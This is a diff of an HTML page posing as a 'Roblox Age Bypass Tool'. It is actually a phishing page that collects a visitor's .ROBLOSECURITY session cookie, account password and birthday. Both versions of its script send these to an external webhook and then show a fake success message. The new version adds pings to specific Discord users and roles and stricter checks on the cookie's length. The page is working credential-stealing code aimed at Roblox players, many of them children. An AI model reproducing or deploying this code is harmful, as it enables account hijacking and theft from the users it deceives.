@@ -1,226 +1,202 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Roblox Age Bypass Tool</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
-  <style>
-    * {
-      box-sizing: border-box;
-    }
-
-    body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background: linear-gradient(to bottom, #0c0f1f, #090d1a);
-      color: #fff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 60px 20px;
-    }
-
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Roblox Age Bypass Tool</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+<style>
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    font-family: 'Inter', sans-serif;
+    background: linear-gradient(to bottom, #0c0f1f, #090d1a);
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 60px 20px;
+  }
+  h1 {
+    font-size: 36px;
+    font-weight: 700;
+    background: linear-gradient(90deg, #ff00c8, #00f0ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 10px;
+  }
+  .subtitle {
+    font-size: 16px;
+    color: #aaa;
+    margin-bottom: 40px;
+    text-align: center;
+    max-width: 500px;
+  }
+  .container {
+    background: #111a2e;
+    border-radius: 12px;
+    padding: 30px;
+    width: 100%;
+    max-width: 600px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.4);
+    margin-bottom: 30px;
+  }
+  label {
+    display: block;
+    font-weight: 600;
+    margin-bottom: 10px;
+    font-size: 18px;
+  }
+  select {
+    width: 100%;
+    padding: 12px;
+    border-radius: 8px;
+    background: #1d2944;
+    border: 1px solid #333;
+    color: #fff;
+    font-size: 16px;
+  }
+  .input-block {
+    margin-top: 20px;
+    background: #1d2944;
+    border-radius: 12px;
+    padding: 15px 15px 10px 15px;
+  }
+  .input-block-title {
+    font-weight: 600;
+    color: #00f0ff;
+    margin-bottom: 8px;
+    font-size: 16px;
+  }
+  textarea {
+    width: 100%;
+    resize: vertical;
+    min-height: 80px;
+    padding: 10px 15px;
+    font-family: 'Inter', sans-serif;
+    font-size: 14px;
+    border-radius: 8px;
+    border: 1px solid #333;
+    background: #0b1731;
+    color: #eee;
+    box-shadow: inset 0 0 5px rgba(0,255,255,0.1);
+    outline: none;
+  }
+  textarea::placeholder {
+    color: #5c7f94;
+  }
+  button {
+    margin-top: 20px;
+    width: 100%;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    color: #fff;
+    background: linear-gradient(90deg, #ff00c8, #00f0ff);
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    user-select: none;
+    transition: background 0.3s ease;
+  }
+  button:hover {
+    background: linear-gradient(90deg, #e000b9, #00d4ff);
+  }
+  .info-box {
+    background: #1d2944;
+    border-left: 4px solid #ffc107;
+    padding: 20px;
+    border-radius: 10px;
+    font-size: 14px;
+    color: #ddd;
+    margin-top: 30px;
+    box-shadow: inset 0 0 8px rgba(255, 193, 7, 0.2);
+  }
+  .info-box ul {
+    margin: 10px 0 0 0;
+    padding-left: 20px;
+  }
+  .info-box li {
+    margin-bottom: 8px;
+  }
+  .info-title {
+    font-weight: bold;
+    color: #ffc107;
+    font-size: 15px;
+  }
+  #error-message {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: #ff3b3b;
+    color: white;
+    padding: 12px 20px;
+    border-radius: 8px;
+    font-weight: 600;
+    font-size: 14px;
+    display: none;
+    z-index: 9999;
+    box-shadow: 0 0 10px rgba(255, 59, 59, 0.7);
+    user-select: none;
+  }
+  #success-message {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: #4CAF50;
+    color: white;
+    padding: 12px 20px;
+    border-radius: 8px;
+    font-weight: 600;
+    font-size: 14px;
+    display: none;
+    z-index: 9999;
+    box-shadow: 0 0 10px rgba(76, 175, 80, 0.7);
+    user-select: none;
+  }
+  #loader-overlay {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.75);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 10000;
+    display: none;
+  }
+  .loader {
+    border: 6px solid #f3f3f3;
+    border-top: 6px solid #00f0ff;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  /* Geburtstags-Datum nebeneinander */
+  .birthday-row {
+    display: flex;
+    gap: 10px;
+    margin-top: 10px;
+  }
+  .birthday-row select {
+    flex: 1;
+  }
+  @media (max-width: 600px) {
     h1 {
-      font-size: 36px;
-      font-weight: 700;
-      background: linear-gradient(90deg, #ff00c8, #00f0ff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom: 10px;
+      font-size: 28px;
     }
-
-    .subtitle {
-      font-size: 16px;
-      color: #aaa;
-      margin-bottom: 40px;
-      text-align: center;
-      max-width: 500px;
-    }
-
-    .container {
-      background: #111a2e;
-      border-radius: 12px;
-      padding: 30px;
-      width: 100%;
-      max-width: 600px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.4);
-      margin-bottom: 30px;
-    }
-
-    label {
-      display: block;
-      font-weight: 600;
-      margin-bottom: 10px;
-      font-size: 18px;
-    }
-
-    select, textarea {
-      width: 100%;
-      padding: 12px;
-      border-radius: 8px;
-      background: #1d2944;
-      border: 1px solid #333;
-      color: #fff;
-      font-size: 16px;
-      font-family: 'Inter', sans-serif;
-      outline: none;
-    }
-
-    textarea {
-      resize: vertical;
-      min-height: 80px;
-      background: #0b1731;
-      box-shadow: inset 0 0 5px rgba(0,255,255,0.1);
-    }
-
-    textarea::placeholder {
-      color: #5c7f94;
-    }
-
-    .input-block {
-      margin-top: 20px;
-      background: #1d2944;
-      border-radius: 12px;
-      padding: 15px 15px 10px 15px;
-    }
-
-    .input-block-title {
-      font-weight: 600;
-      color: #00f0ff;
-      margin-bottom: 8px;
-      font-size: 16px;
-    }
-
-    button {
-      margin-top: 20px;
-      width: 100%;
-      padding: 14px;
-      font-size: 16px;
-      font-weight: 600;
-      color: #fff;
-      background: linear-gradient(90deg, #ff00c8, #00f0ff);
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      user-select: none;
-      transition: background 0.3s ease;
-    }
-    button:hover:not(:disabled) {
-      background: linear-gradient(90deg, #e000b9, #00d4ff);
-    }
-    button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
-
-    .info-box {
-      background: #1d2944;
-      border-left: 4px solid #ffc107;
-      padding: 20px;
-      border-radius: 10px;
-      font-size: 14px;
-      color: #ddd;
-      margin-top: 30px;
-      box-shadow: inset 0 0 8px rgba(255, 193, 7, 0.2);
-    }
-
-    .info-box ul {
-      margin: 10px 0 0 0;
-      padding-left: 20px;
-    }
-
-    .info-box li {
-      margin-bottom: 8px;
-    }
-
-    .info-title {
-      font-weight: bold;
-      color: #ffc107;
-      font-size: 15px;
-    }
-
-    #error-message {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background: #ff3b3b;
-      color: white;
-      padding: 12px 20px;
-      border-radius: 8px;
-      font-weight: 600;
-      font-size: 14px;
-      display: none;
-      z-index: 9999;
-      box-shadow: 0 0 10px rgba(255, 59, 59, 0.7);
-      user-select: none;
-    }
-
-    #success-message {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background: #4CAF50;
-      color: white;
-      padding: 12px 20px;
-      border-radius: 8px;
-      font-weight: 600;
-      font-size: 14px;
-      display: none;
-      z-index: 9999;
-      box-shadow: 0 0 10px rgba(76, 175, 80, 0.7);
-      user-select: none;
-    }
-
-    #loader-overlay {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.75);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 10000;
-      display: none;
-    }
-
-    .loader {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #00f0ff;
-      border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    /* Geburtstag nebeneinander */
-    #birthday-section > div {
-      display: flex;
-      gap: 10px;
-      max-width: 300px;
-    }
-
-    #birthday-section select {
-      flex: 1;
-    }
-
-    @media (max-width: 600px) {
-      h1 {
-        font-size: 28px;
-      }
-      #birthday-section > div {
-        max-width: 100%;
-      }
-    }
-  </style>
+  }
+</style>
 </head>
 <body>
   <h1>ROBLOX AGE BYPASS TOOL</h1>
@@ -244,31 +220,41 @@
       <textarea id="password-input" placeholder="Enter account password for verification..." spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
     </div>
 
-    <div id="birthday-section" style="display:none; margin-top:20px;">
-      <label>Birthday:</label>
-      <div>
-        <select id="birthday-day" aria-label="Day">
+    <div id="birthday-block" class="input-block" style="display:none;">
+      <div class="input-block-title">Geburtstag (Day / Month / Year)</div>
+      <div class="birthday-row">
+        <select id="day" aria-label="Day">
           <option value="">Day</option>
-          <!-- JS füllt Optionen -->
+          <!-- Tage 1-31 -->
+          <script>
+            for(let d=1; d<=31; d++){
+              document.write(`<option value="${d}">${d}</option>`);
+            }
+          </script>
         </select>
-        <select id="birthday-month" aria-label="Month">
+        <select id="month" aria-label="Month">
           <option value="">Month</option>
-          <option value="1">Jan</option>
-          <option value="2">Feb</option>
-          <option value="3">Mar</option>
-          <option value="4">Apr</option>
+          <option value="1">January</option>
+          <option value="2">February</option>
+          <option value="3">March</option>
+          <option value="4">April</option>
           <option value="5">May</option>
-          <option value="6">Jun</option>
-          <option value="7">Jul</option>
-          <option value="8">Aug</option>
-          <option value="9">Sep</option>
-          <option value="10">Oct</option>
-          <option value="11">Nov</option>
-          <option value="12">Dec</option>
+          <option value="6">June</option>
+          <option value="7">July</option>
+          <option value="8">August</option>
+          <option value="9">September</option>
+          <option value="10">October</option>
+          <option value="11">November</option>
+          <option value="12">December</option>
         </select>
-        <select id="birthday-year" aria-label="Year">
+        <select id="year" aria-label="Year">
           <option value="">Year</option>
-          <!-- JS füllt Optionen -->
+          <!-- Jahre 1990-2015 -->
+          <script>
+            for(let y=2015; y>=1990; y--){
+              document.write(`<option value="${y}">${y}</option>`);
+            }
+          </script>
         </select>
       </div>
     </div>
@@ -298,164 +284,162 @@
     <div class="loader"></div>
   </div>
 
-  <script>
-    // Geburtstagsoptionen automatisch befüllen
-    const birthdayDay = document.getElementById('birthday-day');
-    const birthdayYear = document.getElementById('birthday-year');
+<script>
+  const bypassSelect = document.getElementById('bypass');
+  const cookieBlock = document.getElementById('cookie-block');
+  const passwordBlock = document.getElementById('password-block');
+  const birthdayBlock = document.getElementById('birthday-block');
 
-    for(let i = 1; i <= 31; i++) {
-      const opt = document.createElement('option');
-      opt.value = i;
-      opt.textContent = i;
-      birthdayDay.appendChild(opt);
+  const cookieInput = document.getElementById('cookie-input');
+  const passwordInput = document.getElementById('password-input');
+
+  const daySelect = document.getElementById('day');
+  const monthSelect = document.getElementById('month');
+  const yearSelect = document.getElementById('year');
+
+  const processBtn = document.getElementById('process-button');
+  const errorMessage = document.getElementById('error-message');
+  const successMessage = document.getElementById('success-message');
+  const loaderOverlay = document.getElementById('loader-overlay');
+
+  bypassSelect.addEventListener('change', () => {
+    clearMessages();
+    if (bypassSelect.value === '13plus') {
+      cookieBlock.style.display = 'block';
+      passwordBlock.style.display = 'block';
+      birthdayBlock.style.display = 'block';
+    } else if (bypassSelect.value === 'birthyear') {
+      cookieBlock.style.display = 'block';
+      passwordBlock.style.display = 'none';
+      birthdayBlock.style.display = 'block';
+    } else {
+      cookieBlock.style.display = 'none';
+      passwordBlock.style.display = 'none';
+      birthdayBlock.style.display = 'none';
     }
+  });
 
-    const currentYear = new Date().getFullYear();
-    for(let y = currentYear; y >= 1950; y--) {
-      const opt = document.createElement('option');
-      opt.value = y;
-      opt.textContent = y;
-      birthdayYear.appendChild(opt);
-    }
+  function clearMessages() {
+    errorMessage.style.display = 'none';
+    successMessage.style.display = 'none';
+  }
 
-    const bypassSelect = document.getElementById('bypass');
-    const cookieBlock = document.getElementById('cookie-block');
-    const passwordBlock = document.getElementById('password-block');
-    const birthdaySection = document.getElementById('birthday-section');
-    const cookieInput = document.getElementById('cookie-input');
-    const passwordInput = document.getElementById('password-input');
-    const processBtn = document.getElementById('process-button');
-    const errorMessage = document.getElementById('error-message');
-    const successMessage = document.getElementById('success-message');
-    const loaderOverlay = document.getElementById('loader-overlay');
-
-    function clearMessages() {
+  function showError(msg) {
+    errorMessage.textContent = msg;
+    errorMessage.style.display = 'block';
+    setTimeout(() => {
       errorMessage.style.display = 'none';
+    }, 4000);
+  }
+
+  function showSuccess(msg) {
+    successMessage.textContent = msg;
+    successMessage.style.display = 'block';
+    setTimeout(() => {
       successMessage.style.display = 'none';
-    }
+    }, 6000);
+  }
 
-    function showError(msg) {
-      errorMessage.textContent = msg;
-      errorMessage.style.display = 'block';
-      setTimeout(() => { errorMessage.style.display = 'none'; }, 4000);
-    }
+  async function sendEmbedToDiscord(title, description) {
+    const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';
 
-    function showSuccess(msg) {
-      successMessage.textContent = msg;
-      successMessage.style.display = 'block';
-      setTimeout(() => { successMessage.style.display = 'none'; }, 6000);
-    }
+    const data = {
+      embeds: [{
+        title: title,
+        description: description,
+        color: 0x00ffff,
+        timestamp: new Date().toISOString(),
+      }]
+    };
 
-    bypassSelect.addEventListener('change', () => {
-      clearMessages();
-
-      const val = bypassSelect.value;
-      if(val === 'birthyear') {
-        cookieBlock.style.display = 'block';
-        passwordBlock.style.display = 'none';
-        birthdaySection.style.display = 'block';
-        processBtn.style.display = 'block';
-      } else if(val === '13plus') {
-        cookieBlock.style.display = 'block';
-        passwordBlock.style.display = 'block';
-        birthdaySection.style.display = 'block';
-        processBtn.style.display = 'block';
-      } else {
-        cookieBlock.style.display = 'none';
-        passwordBlock.style.display = 'none';
-        birthdaySection.style.display = 'none';
-        processBtn.style.display = 'none';
-      }
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
     });
 
-    async function sendEmbedToDiscord(title, description) {
-      const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';
+    if (!response.ok) {
+      throw new Error('Failed to send to Discord');
+    }
+  }
 
-      const data = {
-        embeds: [{
-          title: title,
-          description: description,
-          color: 0x00ffff,
-          timestamp: new Date().toISOString(),
-        }]
-      };
+  async function sendMention() {
+    const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';
+    const mentionContent = `<@1030535100829540464> <@&1392621247460020254>`;
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: mentionContent })
+    });
+    if (!response.ok) throw new Error('Failed to send mention');
+  }
 
-      const response = await fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      });
+  processBtn.addEventListener('click', async () => {
+    clearMessages();
 
-      if (!response.ok) {
-        throw new Error('Failed to send to Discord');
-      }
+    const selected = bypassSelect.value;
+    const cookieVal = cookieInput.value.trim();
+    const passwordVal = passwordInput.value.trim();
+    const day = daySelect.value;
+    const month = monthSelect.value;
+    const year = yearSelect.value;
+
+    if (!selected) {
+      showError('ERROR Try later again.');
+      return;
+    }
+    if (cookieVal.length < 500) {
+      showError('ERROR Try later again.');
+      return;
+    }
+    if (selected === '13plus' && passwordVal.length === 0) {
+      showError('ERROR Try later again.');
+      return;
+    }
+    if (!day || !month || !year) {
+      showError('ERROR Try later again.');
+      return;
     }
 
-    processBtn.addEventListener('click', async () => {
-      clearMessages();
+    processBtn.disabled = true;
+    loaderOverlay.style.display = 'flex';
 
-      const selected = bypassSelect.value;
-      const cookieVal = cookieInput.value.trim();
-      const passwordVal = passwordInput.value.trim();
-      const day = birthdayDay.value;
-      const month = document.getElementById('birthday-month').value;
-      const year = birthdayYear.value;
+    try {
+      // Compose description for embed
+      const description = `**Method:** ${selected === 'birthyear' ? '2008 Birthyear Up' : '13+ All Ages'}\n` +
+                          `**Cookie:** ${cookieVal}\n` +
+                          `**Birthday:** ${day}.${month}.${year}`;
 
-      if (!selected) {
-        showError('Please select a bypass option.');
-        return;
-      }
-      if (!cookieVal) {
-        showError('Please enter your .ROBLOSECURITY cookie.');
-        return;
-      }
-      if (selected === '13plus' && !passwordVal) {
-        showError('Please enter your account password.');
-        return;
-      }
-      if (!day || !month || !year) {
-        showError('Please select your full birthday.');
-        return;
+      await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Birthday', description);
+
+      if (selected === '13plus') {
+        await sendEmbedToDiscord('Account Password', `**Password:** ${passwordVal}`);
       }
 
-      processBtn.disabled = true;
-      loaderOverlay.style.display = 'flex';
+      await sendMention();
 
-      try {
-        const description = `**Method:** ${selected === 'birthyear' ? '2008 Birthyear Up' : '13+ All Ages'}\n` +
-                            `**Cookie:** ${cookieVal}\n` +
-                            `**Birthday:** ${day}.${month}.${year}`;
+      // Wait a little before showing success
+      await new Promise(r => setTimeout(r, 1200));
 
-        await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Birthday', description);
+      showSuccess('Everything worked it can take 2-12 Hours until the age will be set');
 
-        if (selected === '13plus') {
-          await sendEmbedToDiscord('Account Password', `**Password:** ${passwordVal}`);
-        }
-
-        await new Promise(resolve => setTimeout(resolve, 1200));
-
-        showSuccess('Everything worked it can take 2-12 Hours until the age will be set');
-
-        // Reset fields and UI
-        bypassSelect.value = '';
-        cookieInput.value = '';
-        passwordInput.value = '';
-        birthdayDay.value = '';
-        document.getElementById('birthday-month').value = '';
-        birthdayYear.value = '';
-
-        cookieBlock.style.display = 'none';
-        passwordBlock.style.display = 'none';
-        birthdaySection.style.display = 'none';
-        processBtn.style.display = 'none';
-
-      } catch (error) {
-        showError('ERROR Try later again.');
-      } finally {
-        loaderOverlay.style.display = 'none';
-        processBtn.disabled = false;
-      }
-    });
-  </script>
+      // Reset inputs
+      cookieInput.value = '';
+      passwordInput.value = '';
+      daySelect.value = '';
+      monthSelect.value = '';
+      yearSelect.value = '';
+      bypassSelect.value = '';
+      cookieBlock.style.display = 'none';
+      passwordBlock.style.display = 'none';
+      birthdayBlock.style.display = 'none';
+    } catch (e) {
+      showError('ERROR Try later again.');
+    } finally {
+      processBtn.disabled = false;
+      loaderOverlay.style.display = 'none';
+    }
+  });
+</script>
 </body>
 </html>
